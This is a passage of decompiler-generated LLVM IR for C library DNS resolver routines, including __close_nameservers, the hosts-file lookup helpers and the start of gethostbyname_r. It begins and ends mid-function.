  %v0_2ff34 = load i32, i32* @r5, align 4
  %v2_2ff34 = add i32 %v0_2ff34, -34360
  store i32 %v2_2ff34, i32* @r1, align 4
  %v2_2ff38 = inttoptr i32 %v0_2ff30 to i8*
  %v3_2ff38 = call i32 @__GI_strcoll(i8* %v2_2ff38, i32 %v2_2ff34)
  store i32 %v3_2ff38, i32* %r0.global-to-local, align 4
  %v2_2ff3c = icmp eq i32 %v3_2ff38, 0
  br i1 %v2_2ff3c, label %dec_label_pc_2ff48, label %dec_label_pc_2ff90.backedge

dec_label_pc_2ff48:                               ; preds = %dec_label_pc_2ff2c, %dec_label_pc_2ff0c
  %storemerge = phi i32 [ 20866, %dec_label_pc_2ff0c ], [ 20867, %dec_label_pc_2ff2c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_2ff48 = load i32, i32* @r6, align 4
  %v1_2ff48 = add i32 %v0_2ff48, 1
  store i32 %v1_2ff48, i32* @r0, align 4
  %v0_2ff4c = load i32, i32* @r5, align 4
  %v2_2ff4c = add i32 %v0_2ff4c, %storemerge
  store i32 %v2_2ff4c, i32* @r4, align 4
  %v1_2ff50 = call i32 @atol(i32 %v1_2ff48)
  %v2_2ff50 = trunc i32 %v1_2ff50 to i8
  store i32 %v1_2ff50, i32* %r0.global-to-local, align 4
  %v3_2ff54 = load i32, i32* @r4, align 4
  %v4_2ff54 = inttoptr i32 %v3_2ff54 to i8*
  store i8 %v2_2ff50, i8* %v4_2ff54, align 1
  br label %dec_label_pc_2ff90.backedge

dec_label_pc_2ff5c:                               ; preds = %dec_label_pc_2fcfc
  %v0_2ff60 = load i32, i32* @r5, align 4
  %v2_2ff60 = add i32 %v0_2ff60, -34404
  %v2_2ff6c = add i32 %v0_2ff60, -34392
  %v2_2ff78 = add i32 %v0_2ff60, -34384
  %v2_2ff84 = add i32 %v0_2ff60, -34376
  store i32 %v2_2ff84, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_f230.2043 to i32), i32* @sb, align 4
  store i32 %v2_2ff84, i32* %stack_var_-560, align 4
  %v2_2ff90 = ptrtoint i32* %stack_var_-288 to i32
  %v1_2fd38 = bitcast i32* %stack_var_-288 to i8*
  %v2_2fd68 = ptrtoint i16* %stack_var_-68 to i32
  %v2_2fd88 = ptrtoint i32* %stack_var_-60 to i32
  %v2_2fda0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_2fdb8 = ptrtoint i32* %stack_var_-304 to i32
  %v14_2fdfc = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_2ff90, i32* @r4, align 4
  store i32 %v2_2ff90, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v2_2fd24, i32* %r2.global-to-local, align 4
  %v3_2ffa066 = call i32 @fgets(i32 %v2_2ff90, i32 128, i32 %v2_2fd24)
  store i32 %v3_2ffa066, i32* %r0.global-to-local, align 4
  %v2_2ffa468 = icmp eq i32 %v3_2ffa066, 0
  br i1 %v2_2ffa468, label %dec_label_pc_2ffac, label %dec_label_pc_2fd34

dec_label_pc_2ffac:                               ; preds = %dec_label_pc_2ff90.backedge, %dec_label_pc_2ff5c
  %v0_2ffac = load i32, i32* @fp, align 4
  store i32 %v0_2ffac, i32* %r0.global-to-local, align 4
  %v1_2ffb0 = inttoptr i32 %v0_2ffac to i16*
  %v2_2ffb0 = call i32 @__GI_fclose(i16* %v1_2ffb0)
  store i32 %v2_2ffb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2ffb4

dec_label_pc_2ffb4:                               ; preds = %dec_label_pc_2fcfc, %dec_label_pc_2ffac
  store i32 61996, i32* %r3.global-to-local, align 4
  %v0_2ffb8 = load i32, i32* @r5, align 4
  %v2_2ffb8 = add i32 %v0_2ffb8, 61996
  %v3_2ffb8 = inttoptr i32 %v2_2ffb8 to i32*
  %v4_2ffb8 = load i32, i32* %v3_2ffb8, align 4
  store i32 %v4_2ffb8, i32* %r3.global-to-local, align 4
  %v2_2ffbc = icmp eq i32 %v4_2ffb8, 0
  br i1 %v2_2ffbc, label %dec_label_pc_2ffc4, label %dec_label_pc_30000

dec_label_pc_2ffc4:                               ; preds = %dec_label_pc_2ffb4
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_2ffc8 = call i32 @malloc(i32 28)
  store i32 %v1_2ffc8, i32* %r0.global-to-local, align 4
  store i32 -34348, i32* %r3.global-to-local, align 4
  store i32 61992, i32* %r2.global-to-local, align 4
  %v2_2ffd4 = icmp eq i32 %v1_2ffc8, 0
  %v1_2ffd8 = load i32, i32* @r5, align 4
  br i1 %v2_2ffd4, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_2ffc4
  %v3_2ffd8 = add i32 %v1_2ffd8, -34348
  store i32 %v3_2ffd8, i32* %r3.global-to-local, align 4
  %v3_2ffdc28 = add i32 %v1_2ffd8, 61992
  %v4_2ffdc29 = inttoptr i32 %v3_2ffdc28 to i32*
  store i32 0, i32* %v4_2ffdc29, align 4
  %v1_2ffe0 = load i32, i32* %r3.global-to-local, align 4
  %v2_2ffe0 = load i32, i32* @r5, align 4
  %v3_2ffe0 = load i32, i32* %r2.global-to-local, align 4
  %v4_2ffe0 = add i32 %v3_2ffe0, %v2_2ffe0
  %v5_2ffe0 = inttoptr i32 %v4_2ffe0 to i32*
  store i32 %v1_2ffe0, i32* %v5_2ffe0, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_2ffc4
  %v3_2ffdc = add i32 %v1_2ffd8, 61992
  %v4_2ffdc = inttoptr i32 %v3_2ffdc to i32*
  store i32 %v1_2ffc8, i32* %v4_2ffdc, align 4
  %v1_2ffe4 = load i32, i32* @r5, align 4
  %v2_2ffe4 = load i32, i32* %r3.global-to-local, align 4
  %v3_2ffe4 = add i32 %v2_2ffe4, %v1_2ffe4
  store i32 %v3_2ffe4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 196592, i32* @lr, align 4
  %v1_2ffec = xor i1 %v2_2ffd4, true
  call void @__pseudo_cond_branch(i1 %v1_2ffec, i32 ptrtoint (i32* @global_var_25f40.1708 to i32))
  store i32 61996, i32* %r2.global-to-local, align 4
  %v0_2fff4 = load i32, i32* @r5, align 4
  %v2_2fff4 = add i32 %v0_2fff4, 61996
  %v3_2fff4 = inttoptr i32 %v2_2fff4 to i32*
  %v4_2fff4 = load i32, i32* %v3_2fff4, align 4
  %v1_2fff8 = add i32 %v4_2fff4, 1
  store i32 %v1_2fff8, i32* %r3.global-to-local, align 4
  store i32 %v1_2fff8, i32* %v3_2fff4, align 4
  %v0_30004.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_30000

dec_label_pc_30000:                               ; preds = %dec_label_pc_2ffb4, %.thread4
  %v0_30004 = phi i32 [ %v0_2ffb8, %dec_label_pc_2ffb4 ], [ %v0_30004.pre, %.thread4 ]
  store i32 ptrtoint (i32* @global_var_f230.2043 to i32), i32* @r7, align 4
  %v2_30004 = add i32 %v0_30004, ptrtoint (i32* @global_var_f230.2043 to i32)
  %v3_30004 = inttoptr i32 %v2_30004 to i32*
  %v4_30004 = load i32, i32* %v3_30004, align 4
  store i32 %v4_30004, i32* @r4, align 4
  %v2_30008 = icmp eq i32 %v4_30004, 0
  br i1 %v2_30008, label %dec_label_pc_30010, label %dec_label_pc_30090

dec_label_pc_30010:                               ; preds = %dec_label_pc_30000
  %v2_30010 = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_30010, i32* @r6, align 4
  store i32 %v2_30010, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_3001c = call i32 @__GI_gethostname(i32 %v2_30010, i32 255)
  store i32 %v2_3001c, i32* %r0.global-to-local, align 4
  %v2_30020 = icmp eq i32 %v2_3001c, 0
  br i1 %v2_30020, label %dec_label_pc_3002c, label %dec_label_pc_30090

dec_label_pc_3002c:                               ; preds = %dec_label_pc_30010
  store i32 %v2_30010, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_30034 = call i32 @__GI_strchr(i32 %v2_30010, i32 46)
  store i32 %v2_30034, i32* %r0.global-to-local, align 4
  %v2_30038 = icmp eq i32 %v2_30034, 0
  br i1 %v2_30038, label %dec_label_pc_30090, label %dec_label_pc_30040

dec_label_pc_30040:                               ; preds = %dec_label_pc_3002c
  %v1_30040 = add i32 %v2_30034, 1
  %v2_30040 = inttoptr i32 %v1_30040 to i8*
  %v3_30040 = load i8, i8* %v2_30040, align 1
  %v4_30040 = zext i8 %v3_30040 to i32
  store i32 %v4_30040, i32* %r3.global-to-local, align 4
  %v2_30044 = icmp eq i8 %v3_30040, 0
  store i32 %v1_30040, i32* %r0.global-to-local, align 4
  br i1 %v2_30044, label %dec_label_pc_30090, label %dec_label_pc_30050

dec_label_pc_30050:                               ; preds = %dec_label_pc_30040
  %v2_30050 = call i32 @__GI_strdup(i8* %v2_30040)
  store i32 %v2_30050, i32* %r0.global-to-local, align 4
  store i32 %v2_30050, i32* @r4, align 4
  %v2_30054 = icmp eq i32 %v2_30050, 0
  br i1 %v2_30054, label %dec_label_pc_30090, label %dec_label_pc_3005c

dec_label_pc_3005c:                               ; preds = %dec_label_pc_30050
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_30060 = call i32 @malloc(i32 4)
  store i32 %v1_30060, i32* %r0.global-to-local, align 4
  store i32 61988, i32* %r3.global-to-local, align 4
  %v2_30068 = icmp eq i32 %v1_30060, 0
  %v1_3006c = load i32, i32* @r5, align 4
  %v3_3006c = add i32 %v1_3006c, 61988
  %v4_3006c = inttoptr i32 %v3_3006c to i32*
  store i32 %v1_30060, i32* %v4_3006c, align 4
  br i1 %v2_30068, label %dec_label_pc_30074, label %dec_label_pc_30080

dec_label_pc_30074:                               ; preds = %dec_label_pc_3005c
  %v0_30074 = load i32, i32* @r4, align 4
  store i32 %v0_30074, i32* @r0, align 4
  %v0_30078 = call i32 @free()
  store i32 %v0_30078, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_30090

dec_label_pc_30080:                               ; preds = %dec_label_pc_3005c
  %v0_30080 = load i32, i32* @r5, align 4
  %v1_30080 = load i32, i32* @r7, align 4
  %v2_30080 = add i32 %v1_30080, %v0_30080
  %v3_30080 = inttoptr i32 %v2_30080 to i32*
  %v4_30080 = load i32, i32* %v3_30080, align 4
  %v1_30084 = add i32 %v4_30080, 1
  store i32 %v1_30084, i32* %r3.global-to-local, align 4
  %v0_30088 = load i32, i32* @r4, align 4
  %v2_30088 = inttoptr i32 %v1_30060 to i32*
  store i32 %v0_30088, i32* %v2_30088, align 4
  %v0_3008c = load i32, i32* %r3.global-to-local, align 4
  %v1_3008c = load i32, i32* @r5, align 4
  %v2_3008c = load i32, i32* @r7, align 4
  %v3_3008c = add i32 %v2_3008c, %v1_3008c
  %v4_3008c = inttoptr i32 %v3_3008c to i32*
  store i32 %v0_3008c, i32* %v4_3008c, align 4
  br label %dec_label_pc_30090

dec_label_pc_30090:                               ; preds = %dec_label_pc_30010, %dec_label_pc_30000, %dec_label_pc_2fcec, %dec_label_pc_30050, %dec_label_pc_30040, %dec_label_pc_3002c, %dec_label_pc_30074, %dec_label_pc_30080
  store i32 61984, i32* %r3.global-to-local, align 4
  %v0_30094 = load i32, i32* @r5, align 4
  %v2_30094 = add i32 %v0_30094, 61984
  %v3_30094 = inttoptr i32 %v2_30094 to i32*
  %v4_30094 = load i32, i32* %v3_30094, align 4
  store i32 %v4_30094, i32* %r0.global-to-local, align 4
  %v2_30098 = icmp eq i32 %v4_30094, 0
  br i1 %v2_30098, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_30090
  store i32 196772, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_30090, %bb64
  %v2_300a0 = xor i1 %v2_30098, true
  call void @__pseudo_cond_branch(i1 %v2_300a0, i32 %v4_30094)
  %v2_300a8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_300a8, i32* %r4.global-to-local, align 4
  store i32 %v15_2fc9c, i32* @r8, align 4
  store i32 %v18_2fc9c, i32* @sb, align 4
  store i32 %v21_2fc9c, i32* @sl, align 4
  store i32 %v24_2fc9c, i32* @fp, align 4
  store i32 %v27_2fc9c, i32* %lr.global-to-local, align 4
  ret i32 %v4_30094

; uselistorder directives
  uselistorder i32 %v4_30094, { 1, 0, 2, 3 }
  uselistorder i32 %v2_30010, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_2fda0, { 1, 0 }
  uselistorder i32 %v2_2fd88, { 1, 0 }
  uselistorder i32 %v2_2fd68, { 1, 0 }
  uselistorder i32 %v2_2ff90, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_2ff60, { 1, 0, 2, 3 }
  uselistorder i32 %v1_2ff50, { 1, 0 }
  uselistorder i32 %v0_2fef0, { 1, 0, 2 }
  uselistorder i32 %v1_2fe6817, { 1, 0 }
  uselistorder i32 %v1_2fe6010, { 1, 0 }
  uselistorder i32 %v0_2fe609, { 1, 0 }
  uselistorder i32 %v1_2fe68, { 1, 0 }
  uselistorder i32 %v3_2fde4, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 23, 1, 14, 15, 16, 0, 19, 17, 18, 20, 21, 22, 24, 25, 26, 27, 28 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 17, 5, 0, 7, 6, 14, 8, 9, 10, 11, 12, 13, 15, 16 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 20, 3, 4, 5, 6, 7, 8, 15, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 5, 4, 6, 8, 7, 10, 9, 12, 11, 55, 54, 13, 15, 14, 17, 16, 18, 20, 19, 22, 21, 23, 24, 26, 25, 27, 29, 28, 34, 33, 48, 47, 30, 31, 32, 36, 35, 38, 37, 39, 40, 41, 43, 42, 44, 46, 45, 51, 49, 50, 53, 52 }
  uselistorder i32 (i16*)* @__GI_fclose, { 9, 8, 4, 5, 0, 1, 2, 3, 6, 7, 10 }
  uselistorder i32 (i32)* @atol, { 0, 60, 59, 58, 57, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11 }
  uselistorder i32 58, { 0, 2, 1, 3 }
  uselistorder i32 (i8*)* @__GI_strdup, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 0, 2, 1, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_fopen, { 2, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1 }
  uselistorder i32 -36148, { 1, 0 }
  uselistorder i32 20867, { 0, 3, 4, 2, 1 }
  uselistorder i32 -34424, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34424), { 1, 0 }
  uselistorder i32 61984, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_30090, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_30000, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_2ffb4, { 1, 0 }
  uselistorder label %dec_label_pc_2ffac, { 1, 0 }
  uselistorder label %dec_label_pc_2fe70, { 1, 0 }
  uselistorder label %dec_label_pc_2ff90.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_2fcec, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_300f8 = load i32, i32* @r4, align 4
  store i32 %v3_300f8, i32* %stack_var_-20, align 4
  store i32 61992, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  store i32 -34348, i32* %r3.global-to-local, align 4
  %v4_3010c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 61992) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34348), i32* %r3.global-to-local, align 4
  store i32 196896, i32* @lr, align 4
  %v1_3011c = icmp ne i32 %v4_3010c, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34348)
  call void @__pseudo_cond_branch(i1 %v1_3011c, i32 ptrtoint (i32* @global_var_29ae4.1572 to i32))
  store i32 61996, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_f230.2043 to i32), i32* @r7, align 4
  store i32 61988, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_30130 = load i32, i32* @r5, align 4
  %v3_30130 = add i32 %v1_30130, 61996
  %v4_30130 = inttoptr i32 %v3_30130 to i32*
  store i32 0, i32* %v4_30130, align 4
  %v0_30134 = load i32, i32* %r2.global-to-local, align 4
  %v1_30134 = load i32, i32* @r5, align 4
  %v2_30134 = load i32, i32* %r4.global-to-local, align 4
  %v3_30134 = add i32 %v2_30134, %v1_30134
  %v4_30134 = inttoptr i32 %v3_30134 to i32*
  store i32 %v0_30134, i32* %v4_30134, align 4
  br label %dec_label_pc_3014c

dec_label_pc_3013c:                               ; preds = %dec_label_pc_3014c
  store i32 %v4_30160, i32* %r3.global-to-local, align 4
  store i32 %v1_30154, i32* %v3_3014c, align 4
  %v0_30144 = load i32, i32* %r3.global-to-local, align 4
  %v1_30144 = load i32, i32* %r2.global-to-local, align 4
  %v4_30144 = mul i32 %v1_30144, 4
  %v5_30144 = add i32 %v4_30144, %v0_30144
  %v6_30144 = inttoptr i32 %v5_30144 to i32*
  %v7_30144 = load i32, i32* %v6_30144, align 4
  store i32 %v7_30144, i32* @r0, align 4
  %v0_30148 = call i32 @free()
  br label %dec_label_pc_3014c

dec_label_pc_3014c:                               ; preds = %entry, %dec_label_pc_3013c
  %v0_3014c = load i32, i32* @r5, align 4
  %v1_3014c = load i32, i32* @r7, align 4
  %v2_3014c = add i32 %v1_3014c, %v0_3014c
  %v3_3014c = inttoptr i32 %v2_3014c to i32*
  %v4_3014c = load i32, i32* %v3_3014c, align 4
  store i32 %v4_3014c, i32* @r4, align 4
  %v2_30150 = icmp eq i32 %v4_3014c, 0
  %v1_30154 = add i32 %v4_3014c, -1
  store i32 %v1_30154, i32* %r2.global-to-local, align 4
  %v0_30158 = load i32, i32* @r6, align 4
  store i32 %v0_30158, i32* %r3.global-to-local, align 4
  %v2_30160 = add i32 %v0_30158, %v0_3014c
  %v3_30160 = inttoptr i32 %v2_30160 to i32*
  %v4_30160 = load i32, i32* %v3_30160, align 4
  br i1 %v2_30150, label %dec_label_pc_30160, label %dec_label_pc_3013c

dec_label_pc_30160:                               ; preds = %dec_label_pc_3014c
  store i32 %v4_30160, i32* @r0, align 4
  %v0_30164 = call i32 @free()
  %v0_30168 = load i32, i32* @r4, align 4
  %v1_30168 = load i32, i32* @r5, align 4
  %v2_30168 = load i32, i32* @r6, align 4
  %v3_30168 = add i32 %v2_30168, %v1_30168
  %v4_30168 = inttoptr i32 %v3_30168 to i32*
  store i32 %v0_30168, i32* %v4_30168, align 4
  %v2_30170 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_30170, i32* %r4.global-to-local, align 4
  ret i32 %v0_30164

; uselistorder directives
  uselistorder i32 %v4_30160, { 1, 0 }
  uselistorder i32 %v1_30154, { 1, 0 }
  uselistorder i32* %v3_3014c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 61988, { 4, 1, 7, 5, 6, 0, 3, 2, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_f230.2043 to i32), { 2, 1, 3, 4, 0 }
  uselistorder i32 61996, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -34348, { 1, 2, 0, 3 }
  uselistorder i32 61992, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_3014c, { 1, 0 }
}

define i32 @__get_hosts_byaddr_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-62 = alloca i32, align 4
  %v3_30190 = load i32, i32* @r4, align 4
  %v6_30190 = load i32, i32* @r5, align 4
  %v9_30190 = load i32, i32* @r6, align 4
  %v7_30194 = icmp eq i32 %arg3, 2
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  br i1 %v7_30194, label %dec_label_pc_301c0, label %dec_label_pc_301a8

dec_label_pc_301a8:                               ; preds = %entry
  %v7_301a8 = icmp eq i32 %arg3, 10
  br i1 %v7_301a8, label %dec_label_pc_301bc, label %dec_label_pc_3021c

dec_label_pc_301bc:                               ; preds = %dec_label_pc_301a8
  %v7_301bc = icmp eq i32 %arg2, 16
  br i1 %v7_301bc, label %dec_label_pc_301c4, label %dec_label_pc_3021c

dec_label_pc_301c0:                               ; preds = %entry
  %v7_301b4 = icmp eq i32 %arg2, 4
  br i1 %v7_301b4, label %dec_label_pc_301c4, label %dec_label_pc_3021c

dec_label_pc_301c4:                               ; preds = %dec_label_pc_301bc, %dec_label_pc_301c0
  %v2_301c4 = ptrtoint i32* %stack_var_-62 to i32
  store i32 %v2_301c4, i32* @r4, align 4
  %v4_301d8 = call i32 @__GI_inet_ntop(i32 %arg3, i32 %arg1, i32 %v2_301c4, i32 46)
  %v3_301dc = load i32, i32* %stack_var_0, align 4
  %v0_301fc = load i32, i32* @r5, align 4
  %v0_30208 = load i32, i32* @r6, align 4
  %v9_30210 = inttoptr i32 %v0_30208 to i32*
  %v10_30210 = call i32 @__read_etc_hosts_r(i32 0, i32 %v2_301c4, i32 %v0_301fc, i32 2, i32* %v9_30210, i32 %v3_301dc, i32 %arg6, i32 %arg7, i32 %arg8)
  br label %dec_label_pc_3021c

dec_label_pc_3021c:                               ; preds = %dec_label_pc_301bc, %dec_label_pc_301a8, %dec_label_pc_301c0, %dec_label_pc_301c4
  %storemerge1 = phi i32 [ %v10_30210, %dec_label_pc_301c4 ], [ 0, %dec_label_pc_301c0 ], [ 0, %dec_label_pc_301a8 ], [ 0, %dec_label_pc_301bc ]
  store i32 %v3_30190, i32* @r4, align 4
  store i32 %v6_30190, i32* @r5, align 4
  store i32 %v9_30190, i32* @r6, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_3021c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_301c4, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v0_30228 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  %v10_30264 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_30228, i32* @lr, align 4
  ret i32 %v10_30264

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32*, i32, i32, i32, i32)* @__read_etc_hosts_r, { 1, 0 }
}

define i32 @gethostbyname_r(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp30 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp30, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_30274 = load i32, i32* @r4, align 4
  %v9_30274 = load i32, i32* @r6, align 4
  %v12_30274 = load i32, i32* @r7, align 4
  %v15_30274 = load i32, i32* @r8, align 4
  %v18_30274 = load i32, i32* @sb, align 4
  %v21_30274 = load i32, i32* @sl, align 4
  %v24_30274 = load i32, i32* @fp, align 4
  %v0_3027c = load i32, i32* @r2, align 4
  store i32 %tmp30, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %tmp, i32* @sl, align 4
  %v3_30288 = icmp eq i8* %arg1, null
  %v2_3028c = inttoptr i32 %tmp30 to i32*
  store i32 0, i32* %v2_3028c, align 4
  store i32 %arg2, i32* @r7, align 4
  %v0_30294 = load i32, i32* @r3, align 4
  store i32 %v0_30294, i32* @r6, align 4
  br i1 %v3_30288, label %bb, label %dec_label_pc_302a0

bb:                                               ; preds = %entry
  %v1_30298 = load i32, i32* @r5, align 4
  %v2_30298 = add i32 %v1_30298, 22
  store i32 %v2_30298, i32* @r5, align 4
  br label %dec_label_pc_3055c

dec_label_pc_302a0:                               ; preds = %entry
  %v0_302a0 = call i32 @__GI___errno_location()
  store i32 %v0_302a0, i32* %r0.global-to-local, align 4
  %v3_302a4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_302a4, i32* %ip.global-to-local, align 4
  %v1_302a8 = inttoptr i32 %v0_302a0 to i32*
  %v2_302a8 = load i32, i32* %v1_302a8, align 4
  store i32 %v2_302a8, i32* @r8, align 4
  %v0_302ac = load i32, i32* @r5, align 4
  store i32 %v0_302ac, i32* %v1_302a8, align 4
  %v0_302b0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp19, i32* %ip.global-to-local, align 4
  store i32 %v0_302a0, i32* @r4, align 4
  %v0_302c0 = load i32, i32* @sl, align 4
  store i32 %v0_302c0, i32* %r0.global-to-local, align 4
  %v0_302c4 = load i32, i32* @r7, align 4
  store i32 %v0_302c4, i32* %r2.global-to-local, align 4
  store i32 %v0_3027c, i32* %r3.global-to-local, align 4
  %v0_302cc = load i32, i32* @r6, align 4
  %v8_302d4 = call i32 @__get_hosts_byname_r(i32 %v0_302c0, i32 2, i32 %v0_302c4, i32 %v0_3027c, i32 %v0_302cc, i32 %v0_302b0, i32 %tmp19)
  store i32 %v8_302d4, i32* %r0.global-to-local, align 4
  store i32 %v8_302d4, i32* @r5, align 4
  %v2_302d8 = icmp eq i32 %v8_302d4, 0
  br i1 %v2_302d8, label %bb35, label %dec_label_pc_302e4

bb35:                                             ; preds = %dec_label_pc_302a0
  %v1_302dc = load i32, i32* @r8, align 4
  %v2_302dc = load i32, i32* @r4, align 4
  %v3_302dc = inttoptr i32 %v2_302dc to i32*
  store i32 %v1_302dc, i32* %v3_302dc, align 4
  br label %dec_label_pc_3055c

dec_label_pc_302e4:                               ; preds = %dec_label_pc_302a0
  store i32 %tmp19, i32* %r2.global-to-local, align 4
  %v1_302e8 = inttoptr i32 %tmp19 to i32*
  %v2_302e8 = load i32, i32* %v1_302e8, align 4
  store i32 %v2_302e8, i32* %r3.global-to-local, align 4
  %v7_302ec = icmp eq i32 %v2_302e8, 1
  br i1 %v7_302ec, label %dec_label_pc_30308, label %dec_label_pc_302f4

dec_label_pc_302f4:                               ; preds = %dec_label_pc_302e4
  %v7_302f4 = icmp eq i32 %v2_302e8, 4
  br i1 %v7_302f4, label %dec_label_pc_30328, label %dec_label_pc_302fc

dec_label_pc_302fc:                               ; preds = %dec_label_pc_302f4
  %v3_302fc = icmp eq i32 %v2_302e8, -1
  br i1 %v3_302fc, label %dec_label_pc_3031c, label %dec_label_pc_3055c

dec_label_pc_30308:                               ; preds = %dec_label_pc_302e4
  %v7_30308 = icmp eq i32 %v8_302d4, 2
  br i1 %v7_30308, label %.thread4, label %bb36

bb36:                                             ; preds = %dec_label_pc_30308
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_30330

.thread4:                                         ; preds = %dec_label_pc_30308
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_30330

dec_label_pc_3031c:                               ; preds = %dec_label_pc_302fc
  %v0_3031c = load i32, i32* @r4, align 4
  %v1_3031c = inttoptr i32 %v0_3031c to i32*
  %v2_3031c = load i32, i32* %v1_3031c, align 4
  store i32 %v2_3031c, i32* %r3.global-to-local, align 4
  %v7_30320 = icmp eq i32 %v2_3031c, 2
